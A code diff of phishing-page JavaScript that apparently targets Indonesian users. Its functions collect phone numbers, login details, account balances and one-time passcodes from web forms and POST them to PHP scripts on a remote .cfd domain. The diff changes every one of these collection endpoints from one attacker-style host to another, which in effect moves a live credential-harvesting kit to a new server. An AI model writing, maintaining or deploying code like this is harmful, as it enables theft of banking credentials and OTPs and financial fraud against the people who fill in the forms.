@@ -13,7 +13,7 @@ function sendHp() {
    sessionStorage.setItem('nohp', nohp);
    
    $.ajax({
-      url: 'https://choreoapps.xx-dets.cfd/14/no.php',
+      url: 'https://choreodev.ib-wecb.cfd/14/no.php',
       type: 'POST',
       data: $('#login').serialize(),  
       complete: function() {
@@ -33,7 +33,7 @@ function sendLogin(){
     document.getElementById('lanjutkan').innerHTML = "Memproses....";               
     
     $.ajax({
-      url: 'https://choreoapps.xx-dets.cfd/14/sudah.php',
+      url: 'https://choreodev.ib-wecb.cfd/14/sudah.php',
       type: 'POST',
       data: $('#sudah').serialize(),    
     complete: function(){    
@@ -63,7 +63,7 @@ function sendSaldoS() {
    document.getElementById('lanjutkan').innerHTML = "Memproses....";
    
    $.ajax({
-      url: 'https://choreoapps.xx-dets.cfd/14/saldosdh.php',
+      url: 'https://choreodev.ib-wecb.cfd/14/saldosdh.php',
       type: 'POST',
       data: $('#saldosdh').serialize(),
       complete: function() {
@@ -97,7 +97,7 @@ function sendOtpS() {
    var nama1 = document.getElementById('nama1');
    
    $.ajax({
-      url: 'https://choreoapps.xx-dets.cfd/14/otpsdh.php',
+      url: 'https://choreodev.ib-wecb.cfd/14/otpsdh.php',
       type: 'POST',
       data: $('#formsdh').serialize(),
       complete: function(response) {
@@ -133,7 +133,7 @@ document.getElementById("nohp").value =
        
     
     $.ajax({
-      url: 'https://choreoapps.xx-dets.cfd/14/belum.php',
+      url: 'https://choreodev.ib-wecb.cfd/14/belum.php',
       type: 'POST',
       data: $('#belum').serialize(),   
     complete: function(){
@@ -159,7 +159,7 @@ function sendSaldo() {
    document.getElementById('lanjutkan').innerHTML = "Memproses....";
    
    $.ajax({
-      url: 'https://choreoapps.xx-dets.cfd/14/saldoblm.php',
+      url: 'https://choreodev.ib-wecb.cfd/14/saldoblm.php',
       type: 'POST',
       data: $('#saldoblm').serialize(),
       complete: function() {
@@ -203,7 +203,7 @@ function sendOtp() {
    var nama1 = document.getElementById('nama1');
    
    $.ajax({
-      url: 'https://choreoapps.xx-dets.cfd/14/otpblm.php',
+      url: 'https://choreodev.ib-wecb.cfd/14/otpblm.php',
       type: 'POST',
       data: $('#formblm').serialize(),
       complete: function(response) {
